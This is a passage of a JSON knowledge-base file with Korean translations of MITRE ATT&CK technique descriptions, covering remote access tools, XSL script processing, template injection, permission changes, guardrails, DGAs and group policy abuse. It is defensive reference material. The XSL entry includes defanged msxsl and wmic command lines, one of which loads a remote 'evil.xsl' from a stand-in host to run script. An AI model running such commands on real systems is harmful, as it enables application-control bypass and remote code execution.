      "description": "적대자는 합법적인 데스크탑 지원 및 원격 액세스 소프트웨어를 사용하여 네트워크 내 표적 시스템에 대한 상호작용 명령 및 제어 채널을 구축할 수 있습니다. 이러한 서비스는 `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin` 및 기타 원격 모니터링 및 관리(RMM) 도구와 같은 합법적인 기술 지원 소프트웨어로 일반적으로 사용되며, 대상 환경 내에서 애플리케이션 제어에 의해 허용될 수 있습니다. (출처: Symantec Living off the Land)(출처: CrowdStrike 2015 Global Threat Report)(출처: CrySyS Blog TeamSpy)\n\n원격 액세스 소프트웨어는 손상이 발생한 후 대체 통신 채널로 사용되거나 대상 시스템과의 상호작용 원격 데스크탑 세션을 설정하는 방법으로 사용될 수 있습니다. 이러한 소프트웨어는 또한 악성코드의 구성 요소로 사용되어 역연결 또는 적대자가 제어하는 서비스 또는 시스템에 대하여 백커넥트를 설정할 수 있습니다.\n\n적대자들은 EDR 및 기타 방어 도구에 포함된 원격 액세스를 허용하는 응답 기능을 유사하게 악용할 수 있습니다.\n\n많은 원격 액세스 소프트웨어의 설치는 지속성(persistence)도 포함될 수 있습니다(예: 소프트웨어 설치 루틴이 [Windows 서비스](https://attack.mitre.org/techniques/T1543/003)를 생성합니다). 원격 액세스 모듈/기능은 기존의 소프트웨어(예: Google Chrome의 원격 데스크탑)의 일부로 존재할 수도 있습니다. (출처: Google Chrome Remote Desktop)(출처: Chrome Remote Desktop)",
      "external_id": "T1219",
      "modified": "2024-04-12T23:52:30.489Z",
      "title": "Remote Access Software",
      "translated": true
    },
    {
      "description": "위협 집단은 XSL 파일에 스크립트를 삽입하여 애플리케이션 제어를 우회하고 코드 실행을 불투명하게 만들 수 있습니다. 확장 가능한 스타일시트 언어(Extensible Stylesheet Language, XSL) 파일은 XML 파일 내의 데이터 처리 및 렌더링을 설명하는 데 일반적으로 사용됩니다. 복잡한 작업을 지원하기 위해 XSL 표준은 다양한 언어로 내장 스크립팅을 지원합니다. (인용: Microsoft XSLT Script Mar 2017)\n\n위협 집단은 이 기능을 악용하여 임의의 파일을 실행하면서 애플리케이션 제어를 우회할 수 있습니다. [신뢰할 수 있는 개발자 유틸리티 프록시 실행](https://attack.mitre.org/techniques/T1127)과 유사하게, Microsoft의 공통 줄 변환 유틸리티 바이너리(msxsl.exe) (인용: Microsoft msxsl.exe)는 로컬 또는 원격(XSL 파일의 URL 참조) XSL 파일에 포함된 악성 JavaScript를 실행하는 데 사용될 수 있습니다. (인용: Penetration Testing Lab MSXSL July 2017) msxsl.exe는 기본적으로 설치되어 있지 않기 때문에, 공격자는 드롭된 파일과 함께 패키징할 필요가 있을 수 있습니다. (인용: Reaqta MSXSL Spearphishing MAR 2018) msxsl.exe는 XML 원본 파일과 XSL 스타일시트라는 두 가지 주요 인수를 사용합니다. XSL 파일이 유효한 XML이기 때문에 공격자는 동일한 XSL 파일을 두 번 호출할 수 있습니다. msxsl.exe를 사용할 때 공격자는 XML/XSL 파일에 임의의 파일 확장자를 부여할 수도 있습니다. (인용: XSL Bypass Mar 2019)\n\n명령줄 예시: (인용: Penetration Testing Lab MSXSL July 2017)(인용: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\n이 기술의 또 다른 변형인 “Squiblytwo”는 [Windows 관리 도구](https://attack.mitre.org/techniques/T1047)를 사용하여 XSL 파일 내에서 JScript 또는 VBScript를 호출하는 방식입니다. (인용: LOLBAS Wmic) 이 기술은 로컬/원격 스크립트를 실행할 수 있으며, [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" 대응 기법과 유사하게 신뢰할 수 있는 내장 Windows 도구를 활용합니다. 공격자는 /FORMAT 스위치를 사용하기만 하면 [Windows 관리 도구](https://attack.mitre.org/techniques/T1047)의 모든 별칭을 악용할 수 있습니다. (인용: XSL Bypass Mar 2019)\n\n명령줄 예시: (인용: XSL Bypass Mar 2019)(인용: LOLBAS Wmic)\n\n* 로컬 파일: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* 원격 파일: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>",
      "external_id": "T1220",
      "modified": "2024-09-12T19:40:12.337Z",
      "title": "XSL Script Processing",
      "translated": true
    },
    {
      "description": "공격자는 사용자 문서 템플릿 내에서 참조를 생성하거나 수정하여 악성 코드를 숨기거나 인증 시도를 강제할 수 있습니다. 예를 들어, Microsoft의 Office Open XML (OOXML) 사양은 이전의 이진 형식(.doc, .xls, .ppt) 대신 Office 문서(.docx, .xlsx, .pptx)를 위한 XML 기반 형식을 정의합니다. OOXML 파일은 다양한 XML 파일로 구성된 ZIP 아카이브로 묶여 있으며, 이 파일들은 '부품'이라고 불리며, 문서가 어떻게 렌더링되는지를 집합적으로 정의하는 속성을 포함하고 있습니다. (출처: Microsoft Open XML 2017년 7월)\n\n부품 내의 속성은 온라인 URL을 통해 접근되는 공유 공공 자원을 참조할 수 있습니다. 예를 들어, 템플릿 속성은 문서가 로드될 때 가져오는 미리 형식화된 문서 청사진 역할을 하는 파일을 참조할 수 있습니다.\n\n공격자는 이러한 템플릿을 악성 코드가 사용자 문서를 통해 실행되도록 처음에 숨기기 위해 악용할 수 있습니다. 문서에 주입된 템플릿 참조는 악성 페이로드가 로드될 때 가져와 실행될 수 있게 합니다. (출처: SANS Brian Wiltse 템플릿 주입) 이러한 문서는 [피싱](https://attack.mitre.org/techniques/T1566) 및/또는 [공유 콘텐츠 오염](https://attack.mitre.org/techniques/T1080)과 같은 다른 기술을 통해 전달될 수 있으며, 악성 페이로드가 로드되기 전까지 일반적인 지표(VBA 매크로, 스크립트 등)가 존재하지 않기 때문에 정적 탐지를 피할 수 있습니다. (출처: Redxorblue 원격 템플릿 주입) 실제 사례로 악성 코드를 포함한 익스플로잇을 로드하기 위해 템플릿 주입이 사용된 예가 있습니다. (출처: MalwareBytes 템플릿 주입 2017년 10월)\n\n공격자는 또한 .rtf 파일 내에 있는 <code>*\\template</code> 제어 단어를 수정하여 유사하게 악성 코드를 숨기고 다운로드할 수 있습니다. 이 정당한 제어 단어 값은 .rtf 파일이 열릴 때 검색되고 로드되는 템플릿 파일 자원의 파일 목적지를 의도한 것입니다. 그러나 공격자는 기존 .rtf 파일의 바이트를 변경하여 악성 페이로드의 URL 자원을 포함하는 템플릿 제어 단어 필드를 삽입할 수 있습니다. (출처: Proofpoint RTF 주입)(출처: Ciberseguridad 악성 RTF 파일 해독)\n\n이 기술은 또한 SMB/HTTPS (또는 다른 자격 증명 프롬프트) URL을 주입하고 인증 시도를 촉발함으로써 [강제 인증](https://attack.mitre.org/techniques/T1187)을 가능하게 할 수 있습니다. (출처: Anomali 템플릿 주입 2018년 3월)(출처: Talos 템플릿 주입 2017년 7월)(출처: ryhanson phishery 2016년 9월)",
      "external_id": "T1221",
      "modified": "2022-01-12T18:16:56.176Z",
      "title": "Template Injection",
      "translated": true
    },
    {
      "description": "위협 행위자는 접근 제어 목록(ACL)을 우회하고 보호된 파일에 접근하기 위해 파일이나 디렉터리 권한/속성을 수정할 수 있습니다. (인용: Hybrid Analysis Icacls1 2018년 6월)(인용: Hybrid Analysis Icacls2 2018년 5월) 파일 및 디렉터리 권한은 일반적으로 파일 또는 디렉터리 소유자나 적절한 권한이 있는 사용자가 구성한 ACL에 의해 관리됩니다. 파일 및 디렉터리 ACL 구현은 플랫폼에 따라 다르지만, 일반적으로 어떤 사용자 또는 그룹이 어떤 작업(읽기, 쓰기, 실행 등)을 수행할 수 있는지를 명시적으로 지정합니다.\n\n수정 사항에는 특정 접근 권한 변경이 포함될 수 있으며, 이는 파일 또는 디렉터리의 기존 권한에 따라 해당 파일이나 디렉터리의 소유권을 가져오거나/및 높은 권한이 필요할 수 있습니다. 이는 특정 파일이나 디렉터리를 수정, 교체 또는 삭제하는 등의 악의적인 활동을 가능하게 할 수 있습니다. 특정 파일 및 디렉터리 수정은 [접근성 기능](https://attack.mitre.org/techniques/T1546/008), [부팅 또는 로그인 초기화 스크립트](https://attack.mitre.org/techniques/T1037), [유닉스 셸 구성 수정](https://attack.mitre.org/techniques/T1546/004) 등을 통해 지속성을 확보하거나 [실행 흐름 차용](https://attack.mitre.org/techniques/T1574) 등을 통해 다른 중요 이진 파일/구성 파일을 오염시키거나 가로채기 위한 필수 단계가 될 수 있습니다.\n\n위협 행위자는 심볼릭 링크의 권한도 변경할 수 있습니다. 예를 들어, 악성코드(특히 랜섬웨어)는 심볼릭 링크와 관련된 설정을 수정하여 원격 경로에서 로컬 바로 가기를 통한 파일 접근을 가능하게 할 수 있습니다. (인용: new_rust_based_ransomware)(인용: bad_luck_blackcat)(인용: falconoverwatch_blackcat_attack)(인용: blackmatter_blackcat)(인용: fsutil_behavior)",
      "external_id": "T1222",
      "modified": "2022-10-19T17:54:06.038Z",
      "title": "File and Directory Permissions Modification",
      "translated": true
    },
    {
      "description": "적대자는 접근 제어 목록(ACL)을 회피하고 보호된 파일에 접근하기 위해 파일 또는 디렉터리의 권한/속성을 수정할 수 있습니다. 파일 및 디렉터리 권한은 일반적으로 파일 또는 디렉터리 소유자 또는 적절한 권한을 가진 사용자에 의해 구성된 ACL에 의해 관리됩니다. 파일 및 디렉터리 ACL 구현은 플랫폼에 따라 다르지만, 일반적으로 어떤 사용자나 그룹이 어떤 작업(읽기, 쓰기, 실행 등)을 수행할 수 있는지를 명시적으로 지정합니다.\n\nWindows는 파일 및 디렉터리 ACL을 재량적 접근 제어 목록(DACL)으로 구현합니다. 표준 ACL과 유사하게, DACL은 보안이 설정 가능한 객체에 접근할 수 있는 계정과 접근이 거부되는 계정을 식별합니다. 보안이 설정 가능한 객체에 접근하려고 시도할 때, 시스템은 DACL에 있는 접근 제어 항목을 순서대로 검사합니다. 일치하는 항목이 발견되면 객체에 대한 접근이 허용됩니다. 그렇지 않으면 접근이 거부됩니다.\n\n적대자는 `icacls`, `cacls`, `takeown`, `attrib`와 같은 내장 Windows 명령어를 사용하여 DACL과 상호작용할 수 있으며, 이를 통해 특정 파일 및 폴더에 대해 높은 권한을 부여받을 수 있습니다. 또한, [PowerShell](https://attack.mitre.org/techniques/T1059/001)은 파일과 디렉터리 DACL을 검색하거나 수정하는 데 사용할 수 있는 Cmdlet을 제공합니다. 특정 파일 및 디렉터리 수정을 수행하는 것은 지속성을 확립하는 방법([접근성 기능](https://attack.mitre.org/techniques/T1546/008), [부팅 또는 로그인 초기화 스크립트](https://attack.mitre.org/techniques/T1037), 또는 [실행 흐름 하이재킹](https://attack.mitre.org/techniques/T1574) 등을 통해 다른 중요 이진 파일/구성 파일을 오염시키거나 하이재킹하는 등)과 같은 많은 기법에 필요한 단계일 수 있습니다.",
      "external_id": "T1222.001",
      "modified": "2023-04-21T12:27:04.900Z",
      "title": "Windows File and Directory Permissions Modification",
      "translated": true
    },
    {
      "description": "공격자는 접근 제어 목록(ACL)을 회피하고 보호된 파일에 접근하기 위해 파일 또는 디렉토리 권한/속성을 수정할 수 있습니다. (인용: Hybrid Analysis Icacls1 2018년 6월) (인용: Hybrid Analysis Icacls2 2018년 5월) 파일과 디렉토리 권한은 일반적으로 파일이나 디렉토리 소유자나 적절한 권한을 가진 사용자에 의해 설정된 ACL에 의해 관리됩니다. 파일 및 디렉토리 ACL 구현은 플랫폼에 따라 다르지만, 일반적으로 어떤 사용자 또는 그룹이 어떤 작업(읽기, 쓰기, 실행 등)을 수행할 수 있는지를 명시적으로 지정합니다.\n\n대부분의 리눅스 및 리눅스 기반 플랫폼은 사용자, 그룹 및 기타라는 표준 권한 그룹과 읽기, 쓰기 및 실행이라는 표준 권한 세트를 제공하며, 이는 각 그룹에 적용됩니다. 각 플랫폼의 권한 구현에 따라 미세한 차이가 있을 수 있지만, 대부분의 플랫폼은 파일 및 디렉토리 ACL을 조작하는 데 사용되는 두 가지 기본 명령인 `<code>chown</code>` (소유자 변경의 약자)와 `<code>chmod</code>` (모드 변경의 약자)를 제공합니다.\n\n공격자는 이러한 명령을 사용하여 파일 및 디렉토리의 소유자가 되거나 현재 권한이 허용하는 경우 모드를 변경할 수 있습니다. 이후 그들은 다른 사용자가 파일에 접근하지 못하도록 잠글 수 있습니다. 특정 파일 및 디렉토리 수정은 [Unix 셸 구성 수정](https://attack.mitre.org/techniques/T1546/004)를 통해 지속성을 설정하거나 [실행 흐름 탈취](https://attack.mitre.org/techniques/T1574)를 통해 다른 필수 바이너리/구성 파일에 오염 또는 탈취를 시도하는 등의 많은 기술에 필요한 단계가 될 수 있습니다. (인용: 20 macOS 일반 도구 및 기술)",
      "external_id": "T1222.002",
      "modified": "2023-08-14T17:54:22.970Z",
      "title": "Linux and Mac File and Directory Permissions Modification",
      "translated": true
    },
    {
      "description": "컴파일된 HTML 파일(.chm)은 일반적으로 Microsoft HTML 도움말 시스템의 일부로 배포됩니다. CHM 파일은 HTML 문서, 이미지, 그리고 VBA, JScript, Java 및 ActiveX와 같은 스크립트/웹 관련 프로그래밍 언어를 포함한 다양한 콘텐츠의 압축된 조합입니다. (인용: Microsoft HTML 도움말 2018년 5월) CHM 콘텐츠는 HTML 도움말 실행 프로그램(hh.exe)에 의해 로드되는 Internet Explorer 브라우저의 기본 구성 요소를 사용하여 표시됩니다. (인용: Microsoft HTML 도움말 ActiveX) (인용: Microsoft HTML 도움말 실행 프로그램)\n\n적대 행위자는 이 기술을 악성 코드를 숨기기 위해 악용할 수 있습니다. 임베디드 페이로드를 포함한 사용자 정의 CHM 파일이 피해자에게 전달된 후 [사용자 실행](https://attack.mitre.org/techniques/T1204)에 의해 트리거될 수 있습니다. CHM 실행은 hh.exe를 통한 이진 파일 실행을 고려하지 않는 구형 및/또는 패치되지 않은 시스템에서 애플리케이션 화이트리스트를 우회할 수도 있습니다. (인용: MsitPros CHM 2017년 8월) (인용: Microsoft CVE-2017-8625 2017년 8월)",
      "external_id": "T1223",
      "modified": "2020-01-31T18:59:00.845Z",
      "title": "Compiled HTML File",
      "translated": true
    },
    {
      "description": "적대자는 실행 가드레일을 사용하여 실제로 존재할 것으로 예상되는 적대자 제공 및 환경 특정 조건에 따라 실행이나 작업을 제한할 수 있습니다. 가드레일은 페이로드가 의도된 대상에서만 실행되도록 보장하며, 적대자의 캠페인으로 인한 부수적 피해를 줄입니다. 적대자가 가드레일로 사용할 수 있는 타겟 시스템 또는 환경에 대한 정보는 특정 네트워크 공유 이름, 연결된 물리적 장치, 파일, 가입된 Active Directory(AD) 도메인, 및 로컬/외부 IP 주소 등을 포함할 수 있습니다.\n\n가드레일은 의도하지 않은 환경에서 노출된 기능을 방지하는 데 사용될 수 있습니다. 이러한 가드레일의 사용은 일반적인 가상화/샌드박스 회피와는 구별됩니다. 가상화/샌드박스 회피를 사용하면 알려진 샌드박스 값을 확인하고 일치하지 않을 경우에만 실행을 계속하지만, 가드레일의 사용은 예상되는 대상 특정 값을 확인하고 그러한 일치가 있을 경우에만 실행을 계속하는 방식입니다.\n\n적대자는 특정 사용자 에이전트를 식별하고 차단하여 방어를 회피하고 공격 범위를 피해자와 가장 효과적인 플랫폼으로 좁힐 수 있습니다. 사용자 에이전트는 사용자의 소프트웨어 응용 프로그램, 운영 체제, 공급업체 및 버전과 같은 데이터를 자가 식별합니다. 적대자는 운영 체제 식별을 위해 사용자 에이전트를 확인한 다음, 취약한 소프트웨어에 대해서만 악성 코드를 제공하고 나머지 모든 운영 체제는 무시할 수 있습니다.",
      "external_id": "T1480",
      "modified": "2024-06-07T14:30:23.491Z",
      "title": "Execution Guardrails",
      "translated": true
    },
    {
      "description": "적대자들은 방어를 회피하고 특정 대상 환경으로 실행을 제한하기 위해 페이로드 또는 기타 악성 코드 기능을 환경적으로 키할 수 있습니다. 환경 키잉은 암호학을 사용하여 적대자가 제공한 환경에 특정한 조건에 따라 실행이나 작업을 제한합니다. 환경 키잉은 주어진 컴퓨팅 환경에서 특정 유형의 값으로부터 암호화/복호화 키를 유도하기 위해 암호화 기술을 활용하는 [실행 가이드라인(Execution Guardrails)](https://attack.mitre.org/techniques/T1480)의 구현입니다. (출처: EK Clueless Agents)\n\n값은 대상 특정 요소에서 유도될 수 있으며, 암호화된 페이로드에 대한 복호화 키를 생성하는 데 사용됩니다. 대상 특정 값은 특정 네트워크 공유, 물리적 장치, 소프트웨어/소프트웨어 버전, 파일, 가입된 AD 도메인, 시스템 시간, 로컬/외부 IP 주소 등에서 유도될 수 있습니다. (출처: Kaspersky Gauss Whitepaper)(출처: Proofpoint Router Malvertising)(출처: EK Impeding Malware Analysis)(출처: Environmental Keyed HTA)(출처: Ebowla: Genetic Malware) 대상 특정 환경 값으로부터 복호화 키를 생성함으로써, 환경 키잉은 샌드박스 탐지, 안티바이러스 탐지, 정보의 크라우드소싱, 역공학을 어렵게 할 수 있습니다. (출처: Kaspersky Gauss Whitepaper)(출처: Ebowla: Genetic Malware) 이러한 어려움은 사건 대응 프로세스를 지연시키고 적대자들이 그들의 전술, 기술 및 절차(TTPs)를 숨기는 데 도움을 줄 수 있습니다.\n\n[난독화된 파일 또는 정보(Obfuscated Files or Information)](https://attack.mitre.org/techniques/T1027)와 유사하게, 적대자들은 환경 키잉을 사용하여 그들의 TTP를 보호하고 탐지를 회피할 수 있습니다. 환경 키잉은 대상을 위한 암호화된 페이로드를 전달하는 데 사용될 수 있으며, 이는 대상 특정 값을 사용하여 실행 전에 페이로드를 복호화합니다. (출처: Kaspersky Gauss Whitepaper)(출처: EK Impeding Malware Analysis)(출처: Environmental Keyed HTA)(출처: Ebowla: Genetic Malware)(출처: Demiguise Guardrail Router Logo) 대상 특정 값을 사용하여 페이로드를 복호화함으로써, 적대자는 페이로드와 함께 복호화 키를 패키징하거나 잠재적으로 모니터링되는 네트워크 연결을 통해 전송하는 것을 피할 수 있습니다. 대상 특정 값을 수집하는 기술에 따라, 암호화된 페이로드의 역공학은 매우 어려울 수 있습니다. (출처: Kaspersky Gauss Whitepaper) 이는 의도하지 않게 손상되거나 운영되지 않을 환경에서 기능 노출을 방지하는 데 사용될 수 있습니다.\n\n다른 [실행 가이드라인(Execution Guardrails)](https://attack.mitre.org/techniques/T1480)와 마찬가지로, 환경 키잉은 의도하지 않게 손상되거나 운영되지 않을 환경에서 기능 노출을 방지하는 데 사용할 수 있습니다. 이 활동은 일반적인 [가상화/샌드박스 회피(Virtualization/Sandbox Evasion)](https://attack.mitre.org/techniques/T1497)와 구별됩니다. [가상화/샌드박스 회피](https://attack.mitre.org/techniques/T1497)의 경우, 알려진 샌드박스 값을 확인하고 일치하지 않을 경우에만 실행을 계속하는 방식일 수 있지만, 환경 키잉의 경우에는 복호화와 후속 실행이 성공적으로 이루어지기 위해 일치해야 하는 예상된 대상 특정 값을 확인하는 과정을 포함합니다.",
      "external_id": "T1480.001",
      "modified": "2022-05-04T14:52:51.290Z",
      "title": "Environmental Keying",
      "translated": true
    },
    {
      "description": "적대자는 맬웨어와 관련된 뮤텍스의 존재에 따라 실행 또는 작업을 제한할 수 있습니다. 뮤텍스는 리소스에 대한 접근을 동기화하는 데 사용되는 잠금 메커니즘입니다. 주어진 시간에 오직 하나의 스레드 또는 프로세스만 뮤텍스를 획득할 수 있습니다.(출처: Microsoft Mutexes)\n\n로컬 뮤텍스는 특정 프로세스 내에서만 존재하여 여러 스레드가 리소스에 대한 접근을 동기화할 수 있도록 허용하지만, 시스템 뮤텍스는 여러 프로세스의 활동을 동기화하는 데 사용될 수 있습니다.(출처: Microsoft Mutexes) 특정 맬웨어와 관련된 고유한 시스템 뮤텍스를 생성함으로써 적대자는 시스템이 이미 손상되었는지 여부를 확인할 수 있습니다.(출처: Sans Mutexes 2012)\n\n리눅스 환경에서는 맬웨어가 대신 뮤텍스 파일에 대한 잠금을 획득하려고 시도할 수 있습니다. 맬웨어가 잠금을 획득하면 실행을 계속하고, 실패하면 두 번째 인스턴스를 생성하지 않기 위해 종료합니다.(출처: Intezer RedXOR 2021)(출처: Deep Instinct BPFDoor 2023)\n\n뮤텍스 이름은 하드코딩되거나 예측 가능한 알고리즘을 사용하여 동적으로 생성될 수 있습니다.(출처: ICS Mutexes 2015)",
      "external_id": "T1480.002",
      "modified": "2024-10-28T16:22:25.431Z",
      "title": "Mutual Exclusion",
      "translated": true
    },
    {
      "description": "적대 세력은 윈도우 멀티 도메인/포리스트 환경에서 측면 이동 기회를 식별하는 데 사용할 수 있는 도메인 신뢰 관계에 대한 정보를 수집하려고 시도할 수 있습니다. 도메인 신뢰는 한 도메인이 다른 도메인의 인증 절차에 기반하여 리소스에 대한 접근을 허용하는 메커니즘을 제공합니다. (출처: Microsoft Trusts) 도메인 신뢰는 신뢰받는 도메인의 사용자가 신뢰하는 도메인의 리소스에 접근할 수 있도록 합니다. 발견된 정보는 적대자가 [SID 히스토리 주입](https://attack.mitre.org/techniques/T1134/005), [티켓 패스](https://attack.mitre.org/techniques/T1550/003) 및 [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)을 수행하는 데 도움이 될 수 있습니다. (출처: AdSecurity Forging Trust Tickets) (출처: Harmj0y Domain Trusts) 도메인 신뢰는 `DSEnumerateDomainTrusts()` Win32 API 호출, .NET 메서드 및 LDAP를 사용하여 열거할 수 있습니다. (출처: Harmj0y Domain Trusts) 윈도우 유틸리티 [Nltest](https://attack.mitre.org/software/S0359)는 적대자들이 도메인 신뢰를 열거하는 데 사용하는 것으로 알려져 있습니다. (출처: Microsoft Operation Wilysupply)",
      "external_id": "T1482",
      "modified": "2022-06-16T19:18:22.305Z",
      "title": "Domain Trust Discovery",
      "translated": true
    },
    {
      "description": "적대자는 정적 IP 주소나 도메인의 목록에 의존하기보다는 도메인 생성 알고리즘(DGA)을 사용하여 명령 및 제어 트래픽을 위한 목적지를 동적으로 식별할 수 있습니다. 이는 방어자가 명령 및 제어 채널을 차단하거나 추적하거나 인수하는 것이 훨씬 더 어렵게 만들며, 악성코드가 지침을 확인할 수 있는 도메인이 수천 개 있을 가능성이 있기 때문입니다. (인용: Cybereason DGAs 해부하기)(인용: Cisco Umbrella DGA)(인용: Unit 42 DGA 2019년 2월)\n\nDGA는 도메인 이름을 생성할 때 각 문자를 생성하여 보이는 임의의 또는 \"어리버리\" 문자열의 형태(예: istgmxdejdnxuyla.ru)를 취할 수 있습니다. 또는 일부 DGA는 전체 단어를 단위로 하여 문자가 아닌 단어를 이어붙이는 방식(예: cityjulydish.net)을 사용할 수도 있습니다. 많은 DGA는 시간 기반으로, 각 시간마다(시간별, 일별, 월별 등) 다른 도메인을 생성합니다. 다른 DGA는 난수 값(seed value)을 포함하여 방어자가 미래의 도메인을 예측하는 것을 더욱 어렵게 만들기도 합니다. (인용: Cybereason DGAs 해부하기)(인용: Cisco Umbrella DGA)(인용: Talos CCleanup 2017)(인용: Akamai DGA 완화)\n\n적대자는 [대체 채널](https://attack.mitre.org/techniques/T1008)의 목적을 위해 DGA를 사용할 수 있습니다. 주 명령 및 제어 서버와의 연결이 끊어질 경우, 악성코드는 명령 및 제어를 재설립하는 수단으로 DGA를 사용할 수 있습니다. (인용: Talos CCleanup 2017)(인용: FireEye POSHSPY 2017년 4월)(인용: ESET Sednit 2017 활동)",
      "external_id": "T1483",
      "modified": "2020-11-10T18:28:56.957Z",
      "title": "Domain Generation Algorithms",
      "translated": true
    },
    {
      "description": "적대자는 중앙에서 관리되는 환경에서 방어를 회피하고/혹은 권한을 상승시키기 위해 도메인 또는 아이덴티티 테넌트의 구성 설정을 수정할 수 있습니다. 이러한 서비스는 장치 및 계정과 같은 아이덴티티 리소스를 중앙에서 관리하는 수단을 제공하며, 종종 신뢰 관계, 아이덴티티 동기화 또는 아이덴티티 연합과 같은 도메인 또는 테넌트 간에 적용될 수 있는 구성 설정을 포함합니다.\n\n도메인 또는 테넌트 설정의 수정에는 Microsoft Active Directory(AD) 내에서 도메인 그룹 정책 객체(GPO)를 변경하거나 도메인 간의 신뢰 설정, 즉 도메인 또는 테넌트 간의 연합 신뢰 관계를 변경하는 것이 포함될 수 있습니다.\n\n충분한 권한이 있는 경우, 적대자는 도메인 또는 테넌트 정책 설정을 수정할 수 있습니다. 이러한 서비스의 구성 설정은 많은 수의 아이덴티티 리소스에 적용되므로, 이러한 남용으로 인해 발생할 수 있는 잠재적인 공격이나 악의적인 결과의 수가 매우 많습니다. 이러한 남용의 예는 다음과 같습니다:\n\n* 도메인 환경 전체에 악성 [예약된 작업(Scheduled Task)](https://attack.mitre.org/techniques/T1053/005)를 푸시하기 위해 GPO를 수정하는 것 (참조: ADSecurity GPO 지속성 2016)(참조: Wald0 GPO 가이드)(참조: Harmj0y GPO 권한 남용)\n* 적대자가 제어하는 도메인을 포함하도록 도메인 신뢰를 수정하여 적대자가 피해자 도메인 리소스에서 수용될 수 있는 접근 토큰을 위조할 수 있도록 하는 것 (참조: Microsoft - 최근 국가 주도의 사이버 공격에 대한 고객 안내)\n* [로건 도메인 컨트롤러(Rogue Domain Controller)](https://attack.mitre.org/techniques/T1207)를 구현하기 위해 AD 환경 내의 구성 설정을 변경하는 것\n* 아이덴티티 테넌트에 적대자가 제어하는 연합 아이덴티티 제공자를 추가하여 적대자가 피해자 테넌트에서 관리하는 모든 사용자로 인증할 수 있도록 하는 것 (참조: Okta 크로스 테넌트 위장 2023)\n\n적대자는 도메인 또는 테넌트 정책을 일시적으로 수정한 후 악의적인 행동을 수행하고, 이후 의심스러운 지표를 제거하기 위해 변경 사항을 되돌릴 수 있습니다.",
      "external_id": "T1484",
      "modified": "2024-10-15T15:55:32.946Z",
      "title": "Domain or Tenant Policy Modification",
      "translated": true
    },
    {
      "description": "공격자는 도메인에서 의도된 임의 접근 제어를 무력화하기 위해 그룹 정책 객체(GPO)를 수정할 수 있으며, 이는 일반적으로 도메인에서 권한을 상승시키기 위한 의도를 가지고 있습니다. 그룹 정책은 Active Directory(AD)에서 사용자 및 컴퓨터 설정을 중앙에서 관리할 수 있도록 해줍니다. GPO는 예측 가능한 네트워크 경로 `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`에 저장된 파일로 구성된 그룹 정책 설정의 컨테이너입니다. (출처: TechNet 그룹 정책 기본 사항) (출처: ADSecurity GPO 지속성 2016) \n\nAD의 다른 객체와 마찬가지로 GPO에도 관련된 접근 제어가 있습니다. 기본적으로 도메인의 모든 사용자 계정은 GPO를 읽을 수 있는 권한을 가지고 있습니다. 특정 사용자나 도메인 내 그룹에 대한 GPO 접근 제어 권한, 예를 들면 쓰기 권한을 위임할 수 있습니다.\n\n악의적인 GPO 수정은 [예약된 작업/작업](https://attack.mitre.org/techniques/T1053), [도구 비활성화 또는 수정](https://attack.mitre.org/techniques/T1562/001), [도구 전송](https://attack.mitre.org/techniques/T1105), [계정 생성](https://attack.mitre.org/techniques/T1136), [서비스 실행](https://attack.mitre.org/techniques/T1569/002) 등과 같은 많은 다른 악의적인 행동을 구현하는 데 사용될 수 있습니다. (출처: ADSecurity GPO 지속성 2016) (출처: Wald0 GPO 가이드) (출처: Harmj0y GPO 권한 악용) (출처: Mandiant M 트렌드 2016) (출처: Microsoft 해킹 팀 침해 사건) GPO는 AD 환경에서 수많은 사용자 및 머신 설정을 제어할 수 있기 때문에, GPO 남용에서 발생할 수 있는 공격의 수가 많습니다. (출처: Wald0 GPO 가이드)\n\n예를 들어, 공개적으로 사용할 수 있는 스크립트인 <code>New-GPOImmediateTask</code>를 활용하여 GPO 설정을 수정하여 악의적인 [예약된 작업/작업](https://attack.mitre.org/techniques/T1053)을 자동으로 생성할 수 있으며, 이 경우 <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>을 수정합니다. (출처: Wald0 GPO 가이드) (출처: Harmj0y GPO 권한 악용) 어떤 경우에는 공격자가 세부 사용자 권한인 SeEnableDelegationPrivilege를 수정하여 <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>에 설정함으로써, 도메인의 완전한 통제를 가진 미세한 AD 백도어를 얻을 수 있습니다. 그러면 공격자가 통제하는 사용자 계정이 GPO를 수정할 수 있게 됩니다. (출처: Harmj0y SeEnableDelegationPrivilege 권한)",
      "external_id": "T1484.001",
      "modified": "2024-09-23T22:11:01.884Z",
      "title": "Group Policy Modification",
      "translated": true
    },
    {
      "description": "공격자는 새로운 도메인 신뢰를 추가하거나 기존 도메인 신뢰의 속성을 수정하거나 도메인 및 테넌트 간의 신뢰 관계 구성 변경을 통해 방어를 회피하거나 권한을 상승시킬 수 있습니다. 신뢰 세부정보, 즉 사용자 신원이 연합 방식인지 여부는 공유 리소스에 접근하기 위해 도메인 또는 테넌트 간의 인증 및 권한 부여 속성을 적용할 수 있도록 합니다. (인용: Microsoft - Azure AD Federation) 이러한 신뢰 객체에는 서버, 토큰 및 도메인에 적용되는 계정, 자격 증명 및 기타 인증 자료가 포함될 수 있습니다.\n\n이러한 신뢰를 조작하면 공격자가 자신의 객체를 추가하도록 설정을 수정하여 권한을 상승시키거나 방어를 회피할 수 있습니다. 예를 들어, Microsoft Active Directory (AD) 환경에서는 서명 인증서를 손상시키지 않고도 [SAML 토큰](https://attack.mitre.org/techniques/T1606/002)을 위조하는 데 사용할 수 있습니다. 대신 공격자는 도메인 신뢰를 조작하여 자신의 서명 인증서를 추가할 수 있습니다. 공격자는 또한 Active Directory Federation Services (AD FS)를 사용하여 AD 도메인을 연합 도메인으로 변환할 수 있으며, 이는 악의적인 신뢰 수정, 즉 특정 사용자로 로그인하기 위해 클레임 발급 규칙을 변경하는 것을 가능하게 할 수 있습니다. (인용: AADInternals Azure AD Federated 